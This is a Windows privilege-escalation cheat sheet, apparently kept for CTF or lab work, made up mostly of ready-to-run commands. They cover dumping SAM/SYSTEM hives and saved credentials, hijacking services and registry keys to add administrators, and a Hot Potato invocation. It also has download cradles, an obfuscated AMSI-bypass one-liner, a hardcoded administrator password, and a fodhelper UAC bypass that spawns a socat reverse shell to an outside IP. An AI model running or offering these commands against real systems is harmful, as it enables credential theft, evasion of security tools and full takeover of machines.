#### checklist
- **use enumeration tools**
	- winpeas
	- bloodhound - AD env
	- PowerView
	- PowerUp
	- mimikatz
- [Wadcom](https://wadcoms.github.io/) Cheat sheet for windows offensive tools
- remember to use **netcat** for reverse shells!
- check users in local machine and domain
- check groups in local machine and domain
- check current user groups
- check current user permissions --- what?
- check config files 
- check log files
- check Unattended files
- check powershell history
- check if AV enabled
- Unquoted Service Paths
- Insecure Permissions on Service Executable
- Insecure Service Permissions
- Unpatched Software
- Weak Registry permissions
- writable StartUp Folders
- Windows AutoLogon credentails

- exploiting privileges [show me your privs, and I will lead you to system](https://hackinparis.com/data/slides/2019/talks/HIP2019-Andrea_Pierini-Whoami_Priv_Show_Me_Your_Privileges_And_I_Will_Lead_You_To_System.pdf)
- kernel exploits: https://github.com/ASR511-OO7/windows-kernel-exploits
- offsec exploits db: https://github.com/offensive-security/exploitdb-bin-sploits
- AD cheatsheet : https://wadcoms.github.io/
- sweet potato rule all [potato exploits](https://jlajara.gitlab.io/Potatoes_Windows_Privesc) 
### Unattended Windows Installations
```
# credentails such as <Password>
C:\Unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
```
### IIS config path
```
C:\inetpub\wwwroot\web.config
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
```
### powershell & cmd
```powershell
# secrets dump SAM SYSTEM
secretsdump.py -sam sam -system system local
# putty proxy credentails 
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
# copy system/sam files
reg save HKLM\SAM C:\sam
reg save HKLM\SYSTEM C:\system
# read encrypted file 
$ss = Import-CliXml -Path user.txt
$ss.GetNetworkCredential().Password # password is property to read
# find db connections in IIS config file
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString

# winlogon logged users credentials
reg query "HKLM\SOFTWARE\microsoft\windows nt\currentversion\winlogon"
# saved windows credentails| if creds exist can be used with runas
cmdkey /list 

# AutoRuns - check permisisons  | run on user login
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
# read saved powershell history
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

# run cmd as another user
runas /savecred /user:mike cmd.exe

# scheduled tasks
schtasks /query /tn vulntask /fo list /v

# find unquoted services
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """

# ----exploiting----- 
#AlwaysInstallElevated|check regs files set to 1,if exist create msi shell
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
msiexec /quiet /qn /i payload.msi
# if nt/INTERACTIVE has full perms use exploit to run c code as localSystem
Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f
sc start regsvc
#confirm exploitation
net localgroup administrators
# filepermservice.exe service 
accesschk64.exe -wvu "C:\Program Files\File Permissions Service"
sc start filepermsvc
# abuse startup files at login
icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
# permissions using accesschk64 | SERVICE_CHANGE_CONFIG
accesschk64.exe -wuvc daclsvc
sc config daclsvc binpath= "net localgroup administrators user /add"
sc start daclsvc
# Hot Potato exploit
Import-Module Tater.ps1
Invoke-Tater -Trigger 1 -Command "net localgroup administrators user /add"

```
- powershell
```powershell
# download files
Invoke-WebRequest -URI $URL -OutFile $Path
#
(New-Object System.Net.WebClient).DownloadFile($URL, $Path)
(New-Object System.Net.WebClient).DownloadString($URL)
#
Start-BitsTransfer -Source $URL -Destination $Path
# 
certutil.exe -urlcache -split -f $URL $Path
# find file
Get-ChildItem -Path . -Recurse -Include flag
#bypass execution policy
powershell.exe -nop -ep bypass
# start a process as another user
$username = "BART\Administrator"
$password = "3130438f31186fbaf962f407711faddb"
$secstr = New-Object -TypeName System.Security.SecureString
$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr
Invoke-Command -FilePath "C:\temp\shell.ps1" -Credential $cred -Computer localhost

```

- check list
```
Unquoted Service Paths
Insecure Permissions on Service Executable
Insecure Service Permissions
Unpatched Software
Weak Registry permissions
writable StartUp Folders

```
- Windows Privileges:
```
SeBackup / SeRestore
SeTakeOwnership
SeImpersonate / SeAssignPrimaryToken 

```
- tools
```
WinPEAS
PrivescCheck
WES-NG: Windows Exploit Suggester - Next Generation
Metasploit
```

- firewall and AntiVirus
```powershell

#AMSI bypass
[Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils').GetField('am'+'siInitFailed','NonPu'+'blic,Static').SetValue($null,$true)

```

- UAC bypass
```powershell
# if GUI avaliable choose cmd
msfconfig.exe

# foodhelper bypass windows AV and spawn shell
set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:10.8.129.32:4445 EXEC:cmd.exe,pipes"
reg add "HKCU\Software\Classes\.thm\Shell\Open\command" /d %CMD% /f
reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".thm" /f
fodhelper.exe
# tool
https://github.com/hfiref0x/UACME
```